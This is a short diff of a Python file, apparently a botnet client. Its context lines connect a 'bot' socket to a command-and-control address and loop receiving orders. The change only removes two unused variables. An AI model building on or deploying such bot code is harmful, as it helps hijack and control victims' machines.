@@ -61,9 +61,6 @@ def main():
             bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             bot.connect((cncaddr, cncport))
 
-            check_online = 0
-            check_online2 = 0
-
             while True:
                 received_order = bot.recv(1024).decode(FMT)
                 if received_order == "":
